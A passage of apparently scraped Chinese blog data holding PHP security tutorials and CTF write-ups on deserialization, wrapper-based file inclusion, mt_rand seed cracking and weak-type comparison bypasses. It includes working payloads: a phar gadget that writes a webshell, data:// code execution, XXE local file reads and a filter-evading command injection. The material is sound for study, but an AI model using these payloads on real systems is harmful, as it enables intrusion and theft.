?&gt;\";&#125;@unlink(\"yesi.phar\");$test = new not_useful();$phar = new Phar(\"yesi.phar\"); //实例一个phar对象供后续操作$phar-&gt;startBuffering(); //开始缓冲Phar写操作$phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); // 增加gif文件头$phar-&gt;setMetadata($test);$phar-&gt;addFromString(\"test.txt\",\"test\"); //以字符串的形式添加一个文件到 phar 档案$phar-&gt;stopBuffering();?&gt; 可以改成任意后缀，主要是为了过白名单检测后缀。改成yesi.gifcmd.php 123456789101112131415&lt;?php $recieve = $_GET['recieve']; /*写入文件类操作*/class not_useful&#123; var $file; function __destruct()&#123; $fp = fopen(\"C:\\phpStudy\\PHPTutorial\\WWW\\shell.php\",\"w\"); //自定义写入路径 fputs($fp,$this-&gt;file); fclose($fp); &#125; file_get_contents($recieve);?&gt; 访问 1192.168.0.31/cmd.php?recieve=phar://yesi.gif/test.txt 即可生成shell.php PHP原生类的利用123456当对象被创建的时候调用：__construct当对象被销毁的时候调用：__destruct当对象被当作一个字符串使用时候调用(不仅仅是echo的时候,比如file_exists()判断也会触发)：__toString序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep反序列化恢复对象之前就调用此方法：__wakeup当调用对象中不存在的方法会自动调用此方法：__call SoapClient这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类。 SSRF 123456&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://example.com:5555', 'location'=&gt;'http://example.com:5555/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); Error适用于php7版本 XSS开启报错的情况下: 123456789&lt;?php$a = new Error(\"&lt;script&gt;alert(1)&lt;/script&gt;\");$b = serialize($a);echo urlencode($b);//Test$t = urldecode('O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D');$c = unserialize($t);echo $c; Exception适用于php5、7版本 XSS开启报错的情况下: 12345678&lt;?php$a = new Exception(\"&lt;script&gt;alert(1)&lt;/script&gt;\");$b = serialize($a);echo urlencode($b);//Test$c = urldecode('O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D');echo unserialize($c); 参考文章:浅谈php反序列化漏洞:https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/PHP中SESSION反序列化机制https://blog.spoock.com/2016/10/16/php-serialize-problem/magic函数__wakeup()引发的漏洞http://www.venenof.com/index.php/archives/167/利用 phar 拓展 php 反序列化漏洞攻击面https://paper.seebug.org/680/#22-demoPHP 序列化（serialize）格式详解https://www.neatstudio.com/show-161-1.shtml反序列化之PHP原生类的利用:https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://blog.cfyqy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"}],"author":"ye1s"},{"title":"php伪协议总结","slug":"p伪协议总结","date":"2019-03-12T12:25:00.000Z","updated":"2020-04-13T08:17:58.879Z","comments":true,"path":"article/62dcc0a4.html","link":"","permalink":"https://blog.cfyqy.com/article/62dcc0a4.html","excerpt":"理清一下，每个协议的利用思路","text":"理清一下，每个协议的利用思路 相关栗子12345678910111213141516三个白帽payload:php://filter/write=convert.base64-decode/resource=shell.phpbypass：死亡die,base64在解码时会忽略特殊字符pctf2016payload:data:text/plain;base64,MS50eHQ=bypass:stripos等if判断hctf2016+swpu2016payload1+payload2payload1:php://filter/convert.base64-encode/resource=../flag.phppayload2:phar://xxx.jpg/shell西安华山杯2016payload:php://inputpayload:data:text/plain;base64,xxxx php://php://filter这个经常在ctf比赛中用来读取源码，返回的是base64加密后的结果。假设index.php源码如下：读取文件。在 1234&lt;?php @include($_GET[\"file\"]); show_source(__FILE__);?&gt; 利用php://filter读取index.php源码 1http://XXX/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 死亡退出 123456789101112&lt;?php show_source(__FILE__); $c=\"&lt;?php exit;?&gt;\"; @$c.=$_POST['c']; @$filename=$_POST['file']; if(!isset($filename)) &#123; file_put_contents('tmp.php', ''); &#125; @file_put_contents($filename, $c); include('tmp.php');?&gt; php://input1234567891011&lt;?php$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //class.php&#125;else&#123; echo \"you are not admin ! \";&#125;?&gt; file://直接使用1234567891011121314151617181920212223&lt;?php 省略function upload_please_by_url($url)&#123; if (1 === preg_match('#^[a-z]&#123;3,5&#125;://#', $url)) # Is URL? &#123; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FAILONERROR, true); if (false === ($file_data = curl_exec($ch))) &#123; htmlDisplayError('cURL failed.'); &#125; else &#123; // Thanks upload_please_thx($file_data); &#125; &#125; else &#123; htmlDisplayError('Your URL looks errorneous.'); &#125;&#125;省略?&gt; curl_exec($ch)中的$ch可控，原本是希望能curl到远程服务器上的资源，但这里可以利用file：//读取到本地敏感文件 结合xxe比如XXE中，经常使用它来引入外部实体符号。比如以下payload： 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///c://TEST.txt\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; phar://利用条件：php&gt;5.3假设有个文件phpinfo.txt，其内容为，打包成zip压缩包，可以修改成任何后缀。 zip://使用方法： zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 测试现象： 1http://192.168.0.31/cmd.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.jpg%23phpinfo.php 先将要执行的PHP代码写好文件名为phpinfo.txt，将phpinfo.txt进行zip压缩,压缩文件名为phpinfo.zip,如果可以上传zip文件便直接上传，若不能便将phpinfo.zip重命名为phpinfo.jpg后在上传，其他几种压缩格式也可以这样操作。由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径 bzip2://使用方法： 1compress.zlib://file.gz 测试: 1192.168.0.31/cmd.php?file=compress.bzip2://./phpinfo.jpg zlib://使用方法： 1compress.zlib://file.gz 测试现象： data://12345678访问http://localhost:88/test.php?file=data:text/plain,&lt;?php phpinfo();?&gt;执行phpinfo访问http://localhost:88/test.php?file=data:text/plain,aaaaa输出aaaaa访问http://localhost:88/test.php?file=data:text/plain;base64,PD9waHAgIA0KcGhwaW5mbygpOw0KPz4=执行phpinfo访问http://localhost:88/test.php?file=data:text/plain;base64,aaaaaa输出aaaaaa base64解码后的内容 如果用file_get_contents函数做测试的话，大多都和include函数相同，不同的就是php代码不能解析，直接输出参考文章:浅谈php伪协议及在CTF比赛中的应用https://chybeta.github.io/2007/06/22/%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/php 伪协议https://lorexxar.cn/2016/09/14/php-wei/PHP伪协议分析与应用http://www.4o4notfound.org/index.php/archives/31/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"伪协议","slug":"伪协议","permalink":"https://blog.cfyqy.com/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}],"author":"ye1s"},{"title":"php伪随机数问题","slug":"p伪随机数问题","date":"2019-03-12T06:57:00.000Z","updated":"2021-05-12T03:00:45.421Z","comments":true,"path":"article/5aa79cea.html","link":"","permalink":"https://blog.cfyqy.com/article/5aa79cea.html","excerpt":"弄清一下概念。","text":"弄清一下概念。 mt_srand()php_mt_seed爆破工具下载地址: https://www.openwall.com/php_mt_seed/解压后进入目录，编译 1make 随机上生成两个数，用第一个数作为php_mt_seed参数去爆破，用爆破出来的seed，然后验证结果，可以找到相同的序列。 同时可以猜测在php中产生一系列的随机数时,只进行了一次播种!例题1njctf中的一个例子,只贴部分关键代码: 12345678910111213141516171819202122232425&lt;?phpfunction random_str($length = \"32\")&#123; $set = array(\"a\", \"A\", \"b\", \"B\", \"c\", \"C\", \"d\", \"D\", \"e\", \"E\", \"f\", \"F\", \"g\", \"G\", \"h\", \"H\", \"i\", \"I\", \"j\", \"J\", \"k\", \"K\", \"l\", \"L\", \"m\", \"M\", \"n\", \"N\", \"o\", \"O\", \"p\", \"P\", \"q\", \"Q\", \"r\", \"R\", \"s\", \"S\", \"t\", \"T\", \"u\", \"U\", \"v\", \"V\", \"w\", \"W\", \"x\", \"X\", \"y\", \"Y\", \"z\", \"Z\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;session_start(); $seed = rand(0,999999999);mt_srand($seed);$ss = mt_rand();$hash = md5(session_id() . $ss);setcookie('SESSI0N', $hash, time() + 3600); $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];?&gt; 我们的目标是猜测出filename.这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了例题2 123456789101112131415161718192021222324252627282930iNoUoNVRYN &lt;?php#这不是抽奖程序的源代码！不许看！header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num']))&#123; if($_POST['num']===$str)&#123;x echo \"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;\"; &#125; else&#123; echo \"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;\"; &#125; &#125;show_source(\"check.php\"); 解题 123456789101112131415&lt;?php$pass_now = \"iNoUoNVRYN\";$allowable_characters = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';$length = strlen($allowable_characters) - 1;for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123; for ($i = 0; $i &lt;= $length; $i++) &#123; if ($pass_now[$j] == $allowable_characters[$i]) &#123; echo \"$i $i 0 $length \"; break; &#125; &#125;&#125;#result:8 8 0 61 49 49 0 61 14 14 0 61 56 56 0 61 14 14 0 61 49 49 0 61 57 57 0 61 53 53 0 61 60 60 0 61 49 49 0 61 用php_mt_seed最后还原 1234567891011&lt;?phpmt_srand(495523844);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str;#result:iNoUoNVRYN59zPF5XeT2 rand()php5 中的rand函数调用的是glibc中的random()。其实现算法可以简化为如下代码。 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#define MAX 1000#define seed 1int main() &#123; int r[MAX]; int i; r[0] = seed; for (i=1; i&lt;31; i++) &#123; r[i] = (16807LL * r[i-1]) % 2147483647; if (r[i] &lt; 0) &#123; r[i] += 2147483647; &#125; &#125; for (i=31; i&lt;34; i++) &#123; r[i] = r[i-31]; &#125; for (i=34; i&lt;344; i++) &#123; r[i] = r[i-31] + r[i-3]; &#125; for (i=344; i&lt;MAX; i++) &#123; r[i] = r[i-31] + r[i-3]; printf(\"%d\\n\", ((unsigned int)r[i]) &gt;&gt; 1); &#125; return 0;&#125; 产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1) 123456789&lt;?php$randStr = array();for($i=0;$i&lt;50;$i++)&#123; //先产生 32个随机数 $randStr[$i]=rand(0,30); if($i&gt;=31) &#123; echo \"$randStr[$i]=(\".$randStr[$i-31].\"+\".$randStr[$i-3].\") mod 31\".\"\\n\"; &#125;&#125;?&gt; 例题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123; $username = $_POST['username']; $password = $_POST['password']; $Private_key = $_POST['Private_key']; if (($username == '') || ($password == '') ||($Private_key == '')) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header('refresh:2; url=login.html'); echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\"; exit; &#125; else if($Private_key != '*************' ) &#123; header('refresh:2; url=login.html'); echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\"; exit; &#125; else&#123; if($Private_key === '************')&#123; $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; $link=mysql_connect(\"localhost\",\"root\",\"root\"); mysql_select_db(\"test\",$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo \"&lt;tr&gt;&lt;td&gt;\".$row[\"username\"].\"&lt;/td&gt;&lt;td&gt;\".$row[\"flag\"].\"&lt;/td&gt;&lt;td&gt;\"; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key??? 伪加密，爆破种子 123456789101112131415&lt;?php$pass_now = \"KVQP0LdJKRaV3n9D\";$allowable_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';$length = strlen($allowable_characters) - 1;for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123; for ($i = 0; $i &lt;= $length; $i++) &#123; if ($pass_now[$j] == $allowable_characters[$i]) &#123; echo \"$i $i 0 $length \"; break; &#125; &#125;&#125;# result: 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 找个php7一下版本，运行一下 12345678910111213141516171819202122232425&lt;?phpfunction public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // KVQP0LdJKRaV3n9D&#125;//genarate private_keyfunction private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;mt_srand(1775196155);$Public_key = public_key();print($Public_key);print(\"\\n\");$Private_key=private_key();print($Private_key);//XuNhoueCDCGc 参考文章:Cracking PHP rand() http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/ php的随机数的安全性分析http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BFphp里的随机数https://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"伪随机数","slug":"伪随机数","permalink":"https://blog.cfyqy.com/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"}],"author":"ye1s"},{"title":"详解php弱类型安全问题","slug":"p弱类型问题总结","date":"2019-03-12T02:33:00.000Z","updated":"2021-04-23T03:23:51.880Z","comments":true,"path":"article/4a871cfb.html","link":"","permalink":"https://blog.cfyqy.com/article/4a871cfb.html","excerpt":"基本概念弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。这时候在类型转化、不同类型比较、不合理地传参，会造成意外执行结果和绕过防御。","text":"基本概念弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。这时候在类型转化、不同类型比较、不合理地传参，会造成意外执行结果和绕过防御。 附上思维导图: php 常见的转换主要就是int转换为string，string转换为int。int转string： 123$var &#x3D; 5;方式1：$item &#x3D; (string)$var;方式2：$item &#x3D; strval($var); string转int：intval()函数。 123var_dump(intval(&#39;2&#39;)) &#x2F;&#x2F;2var_dump(intval(&#39;3abcd&#39;)) &#x2F;&#x2F;3var_dump(intval(&#39;abcd&#39;)) &#x2F;&#x2F;0 intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。 php 有三个等号(===)和两个等号(==),区别在于三个等号比较时候，会比较变量类型再比较值，两个等号会转化为同一类型再比较。 12345&lt;?phpvar_dump(1 &#x3D;&#x3D; &#39;1a&#39;);&#x2F;&#x2F;truevar_dump(null&#x3D;&#x3D;false);&#x2F;&#x2F;truevar_dump(0&#x3D;&#x3D;false);&#x2F;&#x2F;truevar_dump(0&#x3D;&#x3D;null);&#x2F;&#x2F;true 比较操作符整形与字符串比较整形与字符串比较时，会将字符串转为整形再比较，转化规则为从字符串左边开始进行转换直到遇到非数值的字符。 12&lt;?var_dump(0 == 'a');//true hash比较当符合\\d+e\\d+ 的字符串，会将这种字符串解析为科学计数法，例如:0e1=0*10=0如果 哈希计算结果 是以 0e 开头，在做比较的时候，可以用这种方法绕过 1234567&lt;?phpvar_dump('0e481036490867661113260034900752' == '0' );//truevar_dump('0e509367213418206700842008763514' == '0e481036490867661113260034900752');//truevar_dump(md5('240610708') == md5('QNKCDZO'));//truevar_dump(md5('aabg7XSs') == md5('aabC9RqS'));//truevar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));//truevar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));//true 十六进制转换php7版本以下，字符串以0x开头时，会将字符串转化为十进制再比较。 12&lt;?phpvar_dump('0xccccccccc' == '54975581388'); //php7以下为true 例题： 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag = 'flag&#123;test&#125;'; $one = ord('1'); //ord — 返回字符的 ASCII 码值 $nine = ord('9'); //ord — 返回字符的 ASCII 码值 $number = '3735929054'; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) ## 1到9不允许，但0允许 &#123; // Aha, digit not allowed! return \"flase\"; &#125; &#125; if($number == $temp) return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp); password的字符串值中不能包含1-9的数值，可以含有0，将3735929054转为16进制结果为：deadc0de，传入?password=0xdeadc0de，即可绕过。 内置函数的参数松散型调用函数时传递给函数无法接受的参数，导致意外的绕过。 md5()php的md5( string $str[, bool $raw_output = FALSE] )，md5()函数的需要一个string类型的参数。当传入一个array时，md5()不会报错，无法求出array的md5值，结果为NULL, 这就会导致任意2个array的md5值都会相等。 1234&lt;?php$a= array('1');$b= array('2');var_dump(md5($a)===md5($b)); 例题： 123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 1)传入两个数组参数 1?username[]=1&amp;password[]=2 2)MD5值相同 12username=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2password=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 sha1()PHP的sha1( string $str[, bool $raw_output = false] )也无法处array类型的参数。例题： 123456789101112131415&lt;?php$flag = \"flag\";if (isset($_GET['name']) and isset($_GET['password']))&#123; if ($_GET['name'] == $_GET['password']) echo 'Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.';&#125;else echo 'Login first!';?&gt; 传入两个不同值得数组类型参数即可，name[]=1&amp;password[]=3。 strcmp()strcmp( string $str1, string $str2) ,二进制安全字符串比较,如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 当传入参数为数组时，会返回NULL，NULL==0。 1234&lt;?php$a= ['2'];$b= \"1\";var_dump(strcmp($a,$b)==0);//true 例题： 123456789&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 传入 a[]=。 switch()如果 switch 是数字类型的 case 的判断时，switch 会将参数转换为 int 类型。 123456789101112&lt;?php$i =\"2qw\"; switch ($i) &#123; case 0: case 1: case 2: echo \"2\"; break; case 3: echo \"3\"; &#125; //2，\"2qw\"转化为2?&gt; in_array()in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) ,检查数组中是否存在某个值，默认使用松散型来判断$needle是否在数组$haystack中，如果设置$strict = true,则在比较时会判断类型是否相等。 1234&lt;?php$array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true ，‘abc’转化为0var_dump(in_array('1bc', $array)); //true，'1bc'转化为1 array_search()array_search( mixed $needle, array $haystack[, bool $strict = false] ),在数组中搜索给定的值，如果成功则返回首个相应的键名 。默认为松散比较比较，不判断类型是否相等。 12345&lt;?php$arrayName = [1,\"3\"];$key=\"1a\";var_dump(array_search($key, $arrayName));//0 strpos()strpos( string $haystack, mixed $needle[, int $offset = 0 ] ),返回 $needle 在 $haystack 中首次出现的数字位置，如果没找到将返回false,当传入的参数$haystack为数组时，将返回NULL,NULL!==false。 例题： 12345678910&lt;?php$flag = \"flag\"; if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) # %00截断 echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求。 is_numeric()PHP提供了is_numeric函数，用来变量判断是否为数字。支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串。 例题1： 12345&lt;?php $temp = $_GET['password'];is_numeric($temp)?die(\"no numeric\"):NULL;if($temp&gt;1336)&#123;echo $flag; payload 1password=1337a 例题2： 1234567891011121314151617&lt;?phpshow_source(__FILE__);$flag = \"flag&#123;xxxxxxx&#125;\";if(isset($_GET['time']))&#123; if(!is_numeric($_GET['time']))&#123; echo 'The time must be number.'; &#125;else if($_GET['time'] &lt; 60 * 60 * 24 * 30 * 2)&#123; echo 'This time is too short.'; &#125;else if($_GET['time'] &gt; 60 * 60 * 24 * 30 * 3)&#123; echo 'This time is too long.'; &#125;else&#123; sleep((int)$_GET['time']); echo $flag; &#125; echo '&lt;hr&gt;';&#125; 1).科学计数法 1?time&#x3D;5.276e6 2).十六进制 1?time&#x3D;0x4F1A01 例题[WUSTCTF2020]朴实无华robots.txt 得知 fAke_f1agggg.php 文件，访问一个假flag，响应头部有提示 fl4g.php文件 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\"; &#125;else&#123; die(\"金钱解决不了穷人的本质问题\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");&#125;else&#123; die(\"去非洲吧\");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \"))&#123; $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\"; system($get_flag); &#125;else&#123; die(\"快到非洲了\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;?&gt; level1 1intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021 这里传入num=1e7即可。在进行intval($num)时被截断成为1，1&lt;2020 =&gt; True;而$num+1时就解析为科学技术法，结果是10000001（也不知道位数对不对，随意啦）。绕过了。 level2 1$md5=$_GET['md5']; 一般绕过md5的方法有两种，一个是以0e开头，后面全是数字的结果，这个会被解析为科学计数法为0；另一个是利用数组绕过。这里利用0e绕过： 1md5('0e215962017') ==&gt; “0e291242476940776845150308577824” get flag这里是个RCE，过滤了空格和cat。空格用%09(tab)绕过，cat用反斜杠绕过，构造成ca\\t: 1fl4g.php?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 